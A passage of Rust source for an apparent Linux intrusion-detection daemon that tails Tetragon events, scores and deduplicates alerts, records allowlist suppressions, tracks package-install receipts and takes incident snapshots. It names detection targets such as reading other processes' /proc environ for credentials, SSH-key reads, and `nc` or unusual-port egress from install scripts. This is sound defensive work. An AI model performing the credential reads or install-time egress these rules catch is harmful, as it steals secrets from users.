//! The daemon: shared state plus the run loop.
//!
//! One thread tails Tetragon's export and does all the detection work; a second
//! thread accepts control-socket connections. They share a `Mutex<Daemon>`,
//! which is cheap because the tail thread only holds the lock while it is
//! folding an event, and the socket handler answers one request per connection.

use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use serde_json::{json, Value};

use crate::alert::{Alert, ExplainOption, UpdateLine};
use crate::allowlist::{Allowlist, Candidate};
use crate::baseline::{Baseline, Demotion, Learned, Observation};
use crate::bundle::{self, AncestryRow};
use crate::config::{severity_at_least, Config};
use crate::context;
use crate::digest;
use crate::event::{HookHit, RawEvent};
use crate::explain::{allowlist_note, build_alert, Finding};
use crate::feeds::Feeds;
use crate::incident;
use crate::policy::{family_of, PolicySet};
use crate::proctable::{ProcInfo, ProcTable};
use crate::provenance::{Classifier, PacmanSl};
use crate::rarity::{RarityInfo, RarityStore, Tuple};
use crate::receipt;
use crate::rules::{pkgtree, RuleCtx, UserRule};
use crate::scoring::{self, EventFacts};
use crate::selectors::Mismatch;
use crate::store::AlertStore;
use crate::tail::Tailer;
use crate::util;

/// The kernel policy that replaced `net-pkg-subtree-egress`. It watches every
/// process at `medium`, because "an unusual port on the internet" is a weak
/// signal on its own; moatd raises it to `high` when the process turns out to
/// be inside a package install, which is the part the kernel could not decide.
pub const SUSPICIOUS_PORT_EGRESS: &str = "moat-net-suspicious-port-egress";

pub static RELOAD: AtomicBool = AtomicBool::new(false);
pub static SHUTDOWN: AtomicBool = AtomicBool::new(false);

extern "C" fn on_signal(sig: libc::c_int) {
    match sig {
        libc::SIGHUP => RELOAD.store(true, Ordering::SeqCst),
        _ => SHUTDOWN.store(true, Ordering::SeqCst),
    }
}

/// SIGHUP reloads policies, allowlist and config; SIGTERM/SIGINT stop cleanly.
pub fn install_signal_handlers() {
    unsafe {
        libc::signal(libc::SIGHUP, on_signal as *const () as libc::sighandler_t);
        libc::signal(libc::SIGTERM, on_signal as *const () as libc::sighandler_t);
        libc::signal(libc::SIGINT, on_signal as *const () as libc::sighandler_t);
        libc::signal(libc::SIGPIPE, libc::SIG_IGN);
    }
}

struct Dedupe {
    id: String,
    first_seen: u64,
    count: u64,
}

pub struct Daemon {
    pub cfg: Config,
    pub cfg_path: PathBuf,
    pub policies: PolicySet,
    pub allowlist: Allowlist,
    pub table: ProcTable,
    pub feeds: Feeds,
    pub store: AlertStore,
    pub rules: Vec<Box<dyn UserRule>>,
    pub mode: String,
    pub homes: Vec<String>,
    /// Template stems that failed to render, from the last `render-policies`.
    pub policies_failed: Vec<String>,
    pub started: u64,
    pub events_seen: u64,
    pub alerts_emitted: u64,
    /// Alerts recorded with `suppressed_by` set: still on the timeline, never
    /// notified, never counted (BASELINE §8).
    pub alerts_suppressed: u64,
    dedupe: HashMap<String, Dedupe>,
    /// exec_id -> alert id, for kill confirmation (NOTES §7).
    pending_kill: HashMap<String, String>,

    // --- baselining --------------------------------------------------------
    /// BASELINE §1: official / foreign / user / unknown, from the pacman db.
    pub provenance: Classifier,
    /// LEARNING §1: decayed per-tuple counters.
    pub rarity: RarityStore,
    /// BASELINE §3 and §4: the learning window, proposals, the noise guard.
    pub baseline: Baseline,
    /// Rarity of the (actor, parent) tuple recorded at `process_exec` time, so
    /// an alert on the same exec quotes it instead of counting it twice.
    exec_rarity: HashMap<String, RarityInfo>,
    /// Guards the one level of recursion `emit` can take (a noise-guard alert
    /// raised from inside the emission of the alert that tripped it).
    in_meta_alert: bool,

    // --- analysis (LEARNING §3, §4, §5) ------------------------------------
    /// LEARNING §3: one accumulator per live package-manager subtree.
    pub receipts: receipt::Tracker,
    /// LEARNING §5: `moatctl set digest on|off`, persisted in state.json.
    pub digest_enabled: bool,
    /// Unix seconds of the last delivered digest, or 0.
    pub digest_last_sent: u64,
    /// Incident snapshots taken since start, for the log and for `status`.
    pub incidents_captured: u64,
    /// Monotonic ULID source. Alert ids are the timeline: `store.load()` keys a
    /// BTreeMap on them, `moatctl list` calls the last one newest, and
    /// `--since <id>` pages on them. A plain `Ulid::new()` only orders by the
    /// millisecond it embeds, so two alerts in the same millisecond — a burst
    /// from one process, or a sensor restart replaying `/proc` — sorted by
    /// their random suffix and the "newest" was a coin flip. The generator
    /// increments the suffix instead, so ids from one run are strictly
    /// increasing whatever the clock resolution.
    ids: ulid::Generator,
}

impl Daemon {
    /// The next alert id, strictly increasing within this run.
    ///
    /// `Generator::generate` only fails after 2^80 ids inside one millisecond;
    /// falling back to a random ULID there is correct-but-unordered, which is
    /// the behaviour we had everywhere before.
    fn next_id(&mut self) -> String {
        self.ids
            .generate()
            .map(|u| u.to_string())
            .unwrap_or_else(|_| ulid::Ulid::new().to_string())
    }

    pub fn new(cfg: Config, cfg_path: &Path) -> std::io::Result<Daemon> {
        let store = AlertStore::open(
            &cfg.paths.alerts(),
            &cfg.paths.alerts_rotated(),
            cfg.thresholds.alerts_max_bytes,
            &cfg.group,
        )?;
        let policies = PolicySet::load(&cfg.paths.policies_dir);
        let allowlist = Allowlist::load(&cfg.paths.allowlist_dir);
        let feeds = Feeds::load(&cfg.paths.feeds());
        let homes = util::human_homes(&cfg.paths.passwd);
        let table = ProcTable::new(cfg.thresholds.ancestry_max, cfg.thresholds.process_prune_secs);
        let state = read_state(&cfg.paths.state_file());
        let mode = persisted_mode(&state).unwrap_or_else(|| cfg.mode.clone());
        let now = util::unix_secs();

        let provenance = Classifier::new(
            &cfg.paths.pacman_local,
            &cfg.baseline.trusted_repos,
            &homes,
            Box::new(PacmanSl {
                bin: cfg.paths.pacman.clone(),
            }),
        );
        let rarity = RarityStore::load(
            &cfg.paths.rarity_file(),
            &cfg.group,
            cfg.learning.half_life_days,
            cfg.learning.rare_max_count,
            cfg.learning.rare_max_age_days,
        );
        let baseline = Baseline::load(
            &cfg.paths.state_dir,
            &cfg.group,
            cfg.baseline.learning_days,
            cfg.baseline.learn_min_days,
            cfg.baseline.noisy_rule_per_day,
            persisted_installed_at(&state),
            now,
        );

        let digest_enabled = persisted_digest_enabled(&state).unwrap_or(cfg.digest.enabled);
        let digest_last_sent = persisted_u64(&state, "digest_summary", "last_sent_unix");

        Ok(Daemon {
            cfg,
            cfg_path: cfg_path.to_path_buf(),
            policies,
            allowlist,
            table,
            feeds,
            store,
            rules: crate::rules::all(),
            mode,
            homes,
            policies_failed: Vec::new(),
            started: now,
            events_seen: 0,
            alerts_emitted: 0,
            alerts_suppressed: 0,
            dedupe: HashMap::new(),
            pending_kill: HashMap::new(),
            provenance,
            rarity,
            baseline,
            exec_rarity: HashMap::new(),
            in_meta_alert: false,
            receipts: receipt::Tracker::default(),
            digest_enabled,
            digest_last_sent,
            incidents_captured: 0,
            ids: ulid::Generator::new(),
        })
    }

    /// SIGHUP: config, policy annotations and allowlist all come back from disk.
    pub fn reload(&mut self) {
        match Config::load(&self.cfg_path) {
            Ok(c) => {
                self.table.max_depth = c.thresholds.ancestry_max;
                self.table.prune_secs = c.thresholds.process_prune_secs;
                self.cfg = c;
            }
            Err(e) => log::warn!("reload: keeping old config: {}", e),
        }
        self.policies = PolicySet::load(&self.cfg.paths.policies_dir);
        self.allowlist = Allowlist::load(&self.cfg.paths.allowlist_dir);
        self.homes = util::human_homes(&self.cfg.paths.passwd);
        self.provenance.set_homes(&self.homes);
        self.baseline.learning_days = self.cfg.baseline.learning_days;
        self.baseline.learn_min_days = self.cfg.baseline.learn_min_days;
        self.baseline.noisy_rule_per_day = self.cfg.baseline.noisy_rule_per_day;
        self.rarity.half_life_days = self.cfg.learning.half_life_days;
        self.rarity.rare_max_count = self.cfg.learning.rare_max_count;
        self.rarity.rare_max_age_days = self.cfg.learning.rare_max_age_days;
        log::info!(
            "reloaded: {} policies, {} allowlist rules",
            self.policies.len(),
            self.allowlist.len()
        );
    }

    pub fn reload_allowlist(&mut self) {
        self.allowlist = Allowlist::load(&self.cfg.paths.allowlist_dir);
    }

    // ------------------------------------------------------------- event path

    pub fn handle_line(&mut self, line: &str) {
        let Some(ev) = RawEvent::parse(line) else {
            return;
        };
        self.events_seen += 1;
        let now = util::unix_secs();

        if let Some(exec) = &ev.process_exec {
            let Some(exec_id) = self.table.on_exec(exec) else {
                return;
            };
            // Rarity learns from every exec, alert or not (LEARNING §1).
            self.record_exec_rarity(&exec_id, now);
            // So does the install receipt (LEARNING §3): what an install did is
            // mostly what it *executed*, and none of that raises an alert.
            self.note_receipt_exec(&exec_id, now);
            let findings = self.run_rules_exec(exec, &exec_id, now);
            self.emit_all(findings);
            return;
        }

        if let Some(exit) = &ev.process_exit {
            if let Some(exec_id) = self.table.on_exit(exit, now) {
                self.confirm_kill(&exec_id, exit.signal.as_deref());
                // The root of a package subtree exiting is what closes a
                // receipt (LEARNING §3).
                self.finish_receipt(&exec_id, exit.status, now);
            }
            return;
        }

        if let Some(hook) = ev.hook() {
            if let Some(p) = &hook.ev.parent {
                self.table.observe(p);
            }
            for a in &hook.ev.ancestors {
                self.table.observe(a);
            }
            let exec_id = hook
                .ev
                .process
                .as_ref()
                .and_then(|p| self.table.observe(p))
                .unwrap_or_default();
            // A `/proc/self/fd/<n>` binary gets its name back from the hook's
            // own exec'd-file argument when it has one.
            self.table
                .resolve_fd_binary(&exec_id, hook.binprm_path().as_deref());

            let mut findings = self.policy_finding(&hook, &exec_id, now).into_iter().collect::<Vec<_>>();
            findings.extend(self.run_rules_hook(&hook, &exec_id, now));
            self.emit_all(findings);
        }
    }

    fn run_rules_exec(&mut self, exec: &crate::event::ExecEvent, exec_id: &str, now: u64) -> Vec<Finding> {
        let mut rules = std::mem::take(&mut self.rules);
        let mut out = Vec::new();
        for r in rules.iter_mut() {
            if !r.enabled(&self.cfg) {
                continue;
            }
            let ctx = self.ctx(now);
            out.extend(r.on_exec(exec, exec_id, &ctx));
        }
        self.rules = rules;
        out
    }

    fn run_rules_hook(&mut self, hook: &HookHit, exec_id: &str, now: u64) -> Vec<Finding> {
        let mut rules = std::mem::take(&mut self.rules);
        let mut out = Vec::new();
        for r in rules.iter_mut() {
            if !r.enabled(&self.cfg) {
                continue;
            }
            let ctx = self.ctx(now);
            out.extend(r.on_hook(hook, exec_id, &ctx));
        }
        self.rules = rules;
        out
    }

    /// Two of the four rarity tuples come from execs alone: "has this parent
    /// ever launched this program" and "has npm ever spawned this". They are
    /// counted here, once, and the result is stashed so an alert about the same
    /// exec quotes it rather than counting it a second time.
    fn record_exec_rarity(&mut self, exec_id: &str, now: u64) {
        let Some(me) = self.table.get(exec_id) else {
            return;
        };
        let exe = me.exe.clone();
        if exe.is_empty() {
            return;
        }
        let parent = self.table.ancestry(exec_id).first().map(|p| p.exe.clone());
        let root = pkgtree::pkg_root_for(&self.table, exec_id).map(|r| r.exe.clone());

        if let Some(parent) = parent {
            let info = self.rarity.observe(
                &Tuple::Parent {
                    exe: exe.clone(),
                    parent,
                },
                now,
            );
            // Bounded: the table is pruned, this map is not, so cap it.
            if self.exec_rarity.len() > 8192 {
                self.exec_rarity.clear();
            }
            self.exec_rarity.insert(exec_id.to_string(), info);
        }
        if let Some(root) = root {
            if root != exe {
                self.rarity
                    .observe(&Tuple::PkgChild { root, child: exe }, now);
            }
        }
    }

    fn ctx(&self, now: u64) -> RuleCtx<'_> {
        RuleCtx {
            cfg: &self.cfg,
            table: &self.table,
            feeds: &self.feeds,
            homes: &self.homes,
            now,
            mode: &self.mode,
        }
    }

    /// A `moat-*` policy event becomes a finding; anything else is
    /// enrichment only (CONTRACT §3).
    ///
    /// Before it does, the event is re-validated against the policy's own
    /// selectors (`selectors.rs`). The kernel has been seen reporting a value
    /// its own filter should have rejected — the SSH-key policy naming
    /// `/sys/devices/system/cpu/online` — and an alert is a claim about what
    /// happened, so such an event becomes a `moat-x-sensor-mismatch` record
    /// instead of a false accusation.
    fn policy_finding(&self, hook: &HookHit, exec_id: &str, _now: u64) -> Option<Finding> {
        let name = hook.policy_name();
        if !name.starts_with("moat-") {
            return None;
        }
        let proc = self.table.get(exec_id)?.clone();
        let path = hook.file_path();
        let hook_name = hook.hook_name();

        // Never alert on our own reads. Taking an incident snapshot means
        // reading /proc/<pid>/{environ,status,cmdline,fd} for the alerting
        // process and every live ancestor (incident.rs), and any file rule that
        // covers those paths turns that into a fresh alert — which takes another
        // snapshot, which reads more. A /proc/<pid>/environ rule under test on
        // 2026-09-03 produced 126 high alerts in four idle minutes this way.
        // The daemon watching its own evidence-gathering is a loop, not a
        // detection, so it is cut here rather than in each policy's
        // matchBinaries, where the next rule would forget it.
        if proc.pid == std::process::id() {
            return None;
        }

        // The environ rule matches `Postfix /environ` in the kernel, because a
        // selector cannot compare the path's pid against the opener's. The exact
        // cut is here: reading your own environment is not credential theft, and
        // it is essentially all of the traffic on this path.
        if name == "moat-cred-proc-environ-read" {
            let is_proc_environ = path
                .as_deref()
                .and_then(crate::rules::self_proc_read::proc_target_pid)
                .is_some();
            if !is_proc_environ {
                return None;
            }
            if crate::rules::self_proc_read::is_self_read(path.as_deref()?, proc.pid) {
                return None;
            }
        }

        if let Err(m) = self
            .policies
            .validate(name, &hook_name, path.as_deref(), &proc.exe)
        {
            return Some(self.mismatch_finding(*m, exec_id, proc, path));
        }

        let meta = self.policies.meta_or_fallback(name);
        let mut f = Finding::new(name, meta, proc);
        f.family_fixup();
        f.hook = hook_name;
        f.exec_id = exec_id.to_string();
        f.ancestry = self.table.ancestry(exec_id).into_iter().cloned().collect();
        f.ancestry_line = self.table.ancestry_line(exec_id);
        f.mode = self.mode.clone();
        f.kill_expected = hook.action_is_kill();

        if let Some(path) = path {
            f.hook_detail = access_word(hook.int_arg());
            f.file = Some(crate::alert::FileRef { path, sha256: None });
        } else if let Some((ip, port)) = hook.dest() {
            f.net = Some(crate::alert::NetRef {
                dst_ip: ip,
                dst_port: port,
                domain: None,
            });
        }

        // The kernel watches suspicious ports for every process; being inside a
        // package install is what turns "unusual" into "act on this".
        if name == SUSPICIOUS_PORT_EGRESS {
            if let Some((root, why)) = pkgtree::pkg_root_with_reason(&self.table, exec_id) {
                let from = std::mem::replace(&mut f.meta.severity, "high".into());
                f.extra_evidence.push(pkgtree::root_evidence(root, &why));
                f.extra_evidence.push(format!(
                    "raised from {} to high: the connecting process is inside a `{}` install, so \
                     this is an install script talking to an unusual port, not a program you started",
                    from,
                    root.comm()
                ));
            }
        }
        if let Some(msg) = &hook.ev.message {
            if !msg.is_empty() {
                f.extra_evidence.push(format!("policy message: {}", msg));
            }
        }
        if let Some(action) = &hook.ev.action {
            f.extra_evidence.push(format!(
                "policy action: {} (mode {}; a kill is only recorded once process_exit reports SIGKILL)",
                action, self.mode
            ));
        }
        Some(f)
    }

    /// The record we keep instead of raising a policy alert we cannot stand
    /// behind. Low severity on purpose: the sensor misbehaved, the workload did
    /// not, and the only useful action is to look at the policy.
    fn mismatch_finding(
        &self,
        m: Mismatch,
        exec_id: &str,
        proc: crate::proctable::ProcInfo,
        path: Option<String>,
    ) -> Finding {
        let would_be = self.policies.meta_or_fallback(&m.policy);
        let mut f = Finding::new(
            crate::rules::SENSOR_MISMATCH,
            crate::rules::sensor_mismatch_meta(&m.why()),
            proc,
        );
        f.hook = m.hook.clone();
        f.exec_id = exec_id.to_string();
        f.ancestry = self.table.ancestry(exec_id).into_iter().cloned().collect();
        f.ancestry_line = self.table.ancestry_line(exec_id);
        f.mode = self.mode.clone();
        f.what_override = Some(format!(
            "Tetragon reported {} for {}, which that policy's own selectors exclude, so no {} alert was raised.",
            m.policy, m.reported, m.policy
        ));
        f.extra_evidence = vec![
            format!(
                "policy: {} (would have been {}: {})",
                m.policy, would_be.severity, would_be.title
            ),
            format!("reported by the kernel: {}", m.reported),
            m.selector_line(),
            "the suppressed policy alert is not in alerts.jsonl; this record is kept so a \
             misbehaving sensor is visible rather than silent"
                .to_string(),
        ];
        if let Some(p) = path {
            f.file = Some(crate::alert::FileRef {
                path: p,
                sha256: None,
            });
        }
        f
    }

    fn emit_all(&mut self, findings: Vec<Finding>) {
        for f in findings {
            self.emit(f);
        }
    }

    /// Score, look up rarity, apply the allowlist, dedupe, append.
    ///
    /// BASELINE §8 changed the shape of this path: a suppressed alert is no
    /// longer dropped on the floor. It is scored, counted for rarity, recorded
    /// with `suppressed_by` set so the timeline can grey it out, and left out of
    /// the badge — because a suppression the user cannot see is exactly the kind
    /// of silence this project promises not to produce.
    pub fn emit(&mut self, mut f: Finding) -> Option<String> {
        let now = util::unix_secs();

        // --- 1. who acted, and from where (BASELINE §1 and §2b) -------------
        f.actor = self.provenance.classify_proc(&f.proc);
        f.context = context::classify(&self.table, &f.exec_id);
        f.extra_evidence
            .push(context::evidence(&self.table, &f.exec_id, f.context));

        // --- 2. severity (BASELINE §2 and §2b) ------------------------------
        let build_tool = self.build_tool_in_chain(&f.exec_id);
        let score = {
            let facts = EventFacts {
                family: &f.meta.family,
                rule: &f.rule,
                hook: &f.hook,
                exe: &f.proc.exe,
                file: f.file.as_ref().map(|x| x.path.as_str()),
                has_net: f.net.is_some(),
                has_ioc: f.ioc.is_some(),
                build_tool_in_chain: build_tool,
                homes: &self.homes,
            };
            scoring::score(
                &f.meta.severity,
                &facts,
                &f.actor,
                f.context,
                self.cfg.baseline.provenance_downgrade,
            )
        };
        f.score = Some(score);

        // --- 3. rarity (LEARNING §1), whether or not this is suppressed -----
        f.rarity = Some(self.observe_rarity(&f, now));

        // --- 4. allowlist: suppression is recorded, not silent --------------
        let parents: Vec<String> = f.ancestry.iter().map(|p| p.exe.clone()).collect();
        let cand = Candidate {
            rule: &f.rule,
            exe: &f.proc.exe,
            file: f.file.as_ref().map(|x| x.path.as_str()),
            parents,
        };
        if let Some(hit) = self.allowlist.find(&cand) {
            let by = format!(
                "{}#{}",
                hit.source
                    .file_name()
                    .map(|n| n.to_string_lossy().to_string())
                    .unwrap_or_else(|| hit.source.display().to_string()),
                hit.index
            );
            log::debug!("{} suppressed by allowlist entry {}", f.rule, by);
            f.suppressed_by = Some(by);
        }

        // --- 5. the noise guard's demotion is not a suppression -------------
        f.demoted = self.baseline.is_demoted(&f.rule);

        // --- 6. the receipt sees it too (LEARNING §3) -----------------------
        // Suppressed findings included: the write still happened, and a receipt
        // records what the install did, not what moat shouted about.
        self.note_receipt_finding(&f);

        // Is this a fold of an alert we already have?
        let key = f.dedupe_key();
        let folded = self
            .dedupe
            .get(&key)
            .filter(|d| now.saturating_sub(d.first_seen) < self.cfg.thresholds.dedupe_secs)
            .map(|d| d.id.clone());

        // The id is allocated here, before anything is killed, because the
        // incident snapshot is named after it and has to be taken while the
        // process still exists (LEARNING §4). A fold reuses the first id and is
        // not captured twice.
        let id = match folded.clone() {
            Some(existing) => existing,
            None => self.next_id(),
        };
        let incident = if folded.is_none() {
            self.capture_incident(&f, &id)
        } else {
            None
        };

        // Enforcement happens before dedupe: the second `nc` of an install is
        // just as fatal as the first, even when its alert folds into one line.
        // A suppressed finding is never enforced — the user said it is fine.
        let killed = if f.suppressed_by.is_none() {
            self.maybe_enforce(&mut f)
        } else {
            false
        };

        if let Some(existing) = folded {
            let count = match self.dedupe.get_mut(&key) {
                Some(d) => {
                    d.count += 1;
                    d.count
                }
                None => 1,
            };
            let mut update = UpdateLine::new(&existing)
                .set("count", Value::from(count))
                .set("ts", Value::from(util::now_rfc3339()));
            if killed {
                update = update.set("action_taken", Value::from("killed"));
            }
            if let Err(e) = self.store.append_update(&update) {
                log::error!("alerts.jsonl: {}", e);
            }
            self.note_baseline(&f, now);
            return Some(existing);
        }

        let note = allowlist_note(
            &self.cfg.paths.allowlist_dir.display().to_string(),
            self.allowlist.len(),
            &f.proc.exe,
            f.file.as_ref().map(|x| x.path.as_str()),
        );
        let mut alert = build_alert(
            &f,
            &id,
            &util::now_rfc3339(),
            &self.cfg.paths.user_allowlist().display().to_string(),
            &note,
        );
        if killed {
            alert.action_taken = "killed".into();
        }
        if let Err(e) = self.store.append_alert(&alert) {
            log::error!("alerts.jsonl: {}", e);
            return None;
        }
        // The snapshot is appended as an update rather than being folded into
        // the record above, so a slow /proc walk can never delay the alert
        // itself (LEARNING §9).
        if let Some(inc) = incident {
            self.incidents_captured += 1;
            log::info!(
                "alert {}: incident snapshot in {} ({} file(s))",
                id,
                inc.dir,
                inc.files.len()
            );
            let u = UpdateLine::new(&id).set(
                "incident",
                serde_json::to_value(&inc).unwrap_or(Value::Null),
            );
            if let Err(e) = self.store.append_update(&u) {
                log::error!("alerts.jsonl: {}", e);
            }
        }
        if alert.is_suppressed() {
            self.alerts_suppressed += 1;
        } else {
            self.alerts_emitted += 1;
        }
        log::info!(
            "alert {} {} {} pid {} ({}){}",
            id,
            alert.severity,
            alert.rule,
            alert.process.pid,
            alert.title,
            alert
                .suppressed_by
                .as_ref()
                .map(|b| format!(" [suppressed by {}]", b))
                .unwrap_or_default()
        );
        self.dedupe.insert(
            key,
            Dedupe {
                id: id.clone(),
                first_seen: now,
                count: 1,
            },
        );
        if f.kill_expected && !f.exec_id.is_empty() {
            self.pending_kill.insert(f.exec_id.clone(), id.clone());
        }

        self.note_baseline(&f, now);
        // A suppressed alert is not noise the user can see, so it does not
        // count towards a demotion.
        if f.suppressed_by.is_none() {
            if let Some(d) = self.baseline.note_alert(&f.rule, now) {
                self.raise_noisy_rule(&d, now);
            }
        }
        Some(id)
    }

    /// Which of the four rarity tuples this finding is about. An alert with no
    /// file and no destination reuses the (actor, parent) count taken at exec
    /// time rather than double-counting it.
    fn observe_rarity(&mut self, f: &Finding, now: u64) -> RarityInfo {
        if let Some(file) = &f.file {
            let verb = match f.hook_detail.as_deref() {
                Some(d) if d.starts_with("read") => "read",
                Some(d) if d.starts_with("write") || d.starts_with("append") => "written to",
                _ if f.hook == "bprm_check_security" => "executed something in",
                _ => "touched",
            };
            return self
                .rarity
                .observe(&Tuple::file(&f.proc.exe, &file.path, verb), now);
        }
        if let Some(net) = &f.net {
            return self.rarity.observe(
                &Tuple::net(&f.proc.exe, &net.dst_ip, net.dst_port, net.domain.as_deref()),
                now,
            );
        }
        if let Some(info) = self.exec_rarity.get(&f.exec_id) {
            return info.clone();
        }
        match f.ancestry.first() {
            Some(p) => self.rarity.observe(
                &Tuple::Parent {
                    exe: f.proc.exe.clone(),
                    parent: p.exe.clone(),
                },
                now,
            ),
            None => RarityInfo::unknown(),
        }
    }

    /// Feed the (rule, actor exe, parent exe, file dir) tuple to the baseline,
    /// and act on what it decides (BASELINE §3).
    fn note_baseline(&mut self, f: &Finding, now: u64) {
        let severity = f.severity().to_string();
        let parent = f.parent_exe();
        let dir = f.file_dir();
        let rarity = f
            .rarity
            .as_ref()
            .map(|r| r.class.as_str())
            .unwrap_or("first_seen");
        let decision = self.baseline.observe(&Observation {
            rule: &f.rule,
            exe: &f.proc.exe,
            parent: &parent,
            dir: &dir,
            severity: &severity,
            provenance: f.actor.provenance.as_str(),
            package: f.actor.package.clone(),
            context: f.context.as_str(),
            rarity,
            suppressed: f.suppressed_by.is_some(),
            demoted: f.demoted,
            ts: util::now_rfc3339(),
            now,
        });
        match decision {
            Learned::Entry { key, toml, comment } => {
                let path = self.cfg.paths.baseline_allowlist();
                match write_learned(&path, &comment, &toml) {
                    Ok(()) => {
                        log::info!("baseline: learned {} ({})", f.rule, comment);
                        self.reload_allowlist();
                    }
                    Err(e) => {
                        log::warn!("{}: {}", path.display(), e);
                        self.baseline.mark_revoked(&key, &format!("could not be written: {}", e));
                    }
                }
            }
            Learned::Proposed { id } => {
                log::info!(
                    "baseline: {} recurs from {}; proposal {} is waiting for review",
                    f.rule,
                    f.proc.exe,
                    id
                );
            }
            Learned::None => {}
        }
    }

    fn build_tool_in_chain(&self, exec_id: &str) -> bool {
        self.table.chain_has(exec_id, scoring::BUILD_TOOLS).is_some()
    }

    // ------------------------------------------- install receipts, LEARNING §3

    /// One exec inside a package subtree. The root gets an accumulator the first
    /// time anything in its tree is seen, so a daemon that started mid-install
    /// still produces a (partial, honest) receipt.
    fn note_receipt_exec(&mut self, exec_id: &str, now: u64) {
        let Some(root) = pkgtree::pkg_root_for(&self.table, exec_id).cloned() else {
            return;
        };
        let Some(me) = self.table.get(exec_id).cloned() else {
            return;
        };
        self.receipts.ensure(&root, now);
        if root.exec_id != me.exec_id {
            self.receipts.note_exec(&root.exec_id, &me);
        }
    }

    /// One finding attributed to a package subtree.
    fn note_receipt_finding(&mut self, f: &Finding) {
        if f.exec_id.is_empty() {
            return;
        }
        let Some(root) = pkgtree::pkg_root_for(&self.table, &f.exec_id).cloned() else {
            return;
        };
        self.receipts.ensure(&root, util::unix_secs());
        let net = f
            .net
            .as_ref()
            .map(|n| n.domain.clone().unwrap_or_else(|| n.dst_ip.clone()));
        self.receipts.note_finding(
            &root.exec_id,
            &f.meta.family,
            f.hook_detail.as_deref(),
            f.file.as_ref().map(|x| x.path.as_str()),
            net.as_deref(),
            f.severity(),
            f.suppressed_by.is_none(),
        );
    }

    /// The subtree's **outermost** root exited: write the receipt.
    ///
    /// Only the outermost one, so a mise shim, the npm it execs and the nested
    /// `npm` frames of a lifecycle script are one install with one receipt.
    fn finish_receipt(&mut self, exec_id: &str, status: Option<u32>, now: u64) {
        let Some(me) = self.table.get(exec_id).cloned() else {
            return;
        };
        if !pkgtree::is_pkg_root(&me) {
            return;
        }
        if let Some(root) = pkgtree::pkg_root_for(&self.table, exec_id) {
            if root.exec_id != exec_id {
                return;
            }
        }
        let r = self.receipts.finish(&me, status, now);
        log::info!(
            "receipt {}: {} ({} script(s), {} destination(s), exit {})",
            r.id,
            r.render().lines().next().unwrap_or_default(),
            r.postinstall_scripts.len(),
            r.network.len(),
            r.exit
        );
        self.receipts.written += 1;
        if let Err(e) = self.store.append_receipt(&r) {
            log::error!("alerts.jsonl: {}", e);
        }
    }

    /// Every receipt ever written, oldest first.
    pub fn receipt_list(&self, last: usize) -> Vec<receipt::Receipt> {
        let mut all = self.store.receipts();
        if all.len() > last {
            all = all.split_off(all.len() - last);
        }
        all
    }

    // ------------------------------------------ incident snapshots, LEARNING §4

    pub fn incidents_dir(&self) -> PathBuf {
        self.cfg.analysis.bundle_dir.clone()
    }

    /// The process tree as the daemon's own table saw it — `tree.txt`, and the
    /// ancestry rows `bundle.md` uses.
    fn tree_rows(&self, f: &Finding) -> Vec<AncestryRow> {
        let mut rows: Vec<AncestryRow> = f
            .ancestry
            .iter()
            .rev()
            .map(|p| AncestryRow {
                pid: p.pid,
                exe: p.exe.clone(),
                args: p.args.clone(),
                cwd: p.cwd.clone(),
            })
            .collect();
        rows.push(AncestryRow {
            pid: f.proc.pid,
            exe: f.proc.exe.clone(),
            args: f.proc.args.clone(),
            cwd: f.proc.cwd.clone(),
        });
        rows
    }

    fn tree_text(rows: &[AncestryRow]) -> String {
        let mut out = String::from(
            "# process tree from moatd's own exec_id table, oldest first.\n\
             # Untrusted: argv and paths are what the processes claimed.\n",
        );
        for (n, r) in rows.iter().enumerate() {
            out.push_str(&format!(
                "{}{} pid {}\n{}    args: {}\n{}    cwd:  {}\n",
                "  ".repeat(n),
                r.exe,
                r.pid,
                "  ".repeat(n),
                r.args,
                "  ".repeat(n),
                r.cwd
            ));
        }
        out
    }

    /// LEARNING §4: capture before any kill. Returns `None` when the alert is
    /// below the threshold, is suppressed, or is one of moat's own meta-alerts
    /// (there is no third-party process to snapshot).
    fn capture_incident(&self, f: &Finding, id: &str) -> Option<incident::Incident> {
        if f.suppressed_by.is_some() {
            return None;
        }
        if !severity_at_least(f.severity(), &self.cfg.incidents.snapshot_min_severity) {
            return None;
        }
        if f.exec_id.is_empty() || f.proc.pid <= 1 {
            return None;
        }
        let rows = self.tree_rows(f);
        let ancestors: Vec<(u32, String)> =
            f.ancestry.iter().map(|p| (p.pid, p.exe.clone())).collect();
        let dir = self.incidents_dir();
        let file = f.file.as_ref().map(|x| x.path.clone());
        let inc = incident::capture(&incident::Target {
            id,
            base: &dir,
            group: &self.cfg.group,
            rule: &f.rule,
            severity: f.severity(),
            title: &f.meta.title,
            ts: &util::now_rfc3339(),
            context: f.context.as_str(),
            mode: &self.mode,
            pid: f.proc.pid,
            exe: &f.proc.exe,
            args: &f.proc.args,
            cwd: &f.proc.cwd,
            file: file.as_deref(),
            script: f.actor.script.as_deref(),
            ancestors: &ancestors,
            tree: &Self::tree_text(&rows),
            homes: &self.homes,
        });
        // Retention is cheapest right after a capture, and it means the cap is
        // enforced even on a machine that never restarts the daemon.
        for gone in incident::prune(
            &dir,
            self.cfg.incidents.retain_days,
            self.cfg.incidents.retain_max,
            util::unix_secs(),
        ) {
            log::info!("incident retention: removed {}", gone);
        }
        Some(inc)
    }

    // ------------------------------------------------------ bundle, LEARNING §2

    /// Write `<incidents dir>/<id>/bundle.md` and return its path.
    ///
    /// The daemon only ever writes the file. Launching the agent is
    /// `moatctl analyze`'s job, in the user's session (LEARNING §2, §7).
    pub fn write_bundle(&self, id: &str) -> Result<PathBuf, String> {
        let alert = self
            .find_alert(id)
            .ok_or_else(|| format!("no alert {}", id))?;
        let all = self.store.load();
        let receipts = self.store.receipts();
        let related_alerts = bundle::related_alerts(&alert, &all, bundle::RELATED_WINDOW_SECS);
        let related_receipts =
            bundle::related_receipts(&alert, &receipts, bundle::RELATED_WINDOW_SECS);

        // The alert on disk records ancestors as pid + exe only; the live table
        // still has argv and cwd for the ones that have not been pruned.
        let mut ancestry: Vec<AncestryRow> = alert
            .process
            .ancestry
            .iter()
            .rev()
            .map(|a| {
                let live = self
                    .table
                    .find_by_pid(a.pid)
                    .filter(|p| p.exe == a.exe || a.exe.is_empty());
                AncestryRow {
                    pid: a.pid,
                    exe: a.exe.clone(),
                    args: live.map(|p| p.args.clone()).unwrap_or_default(),
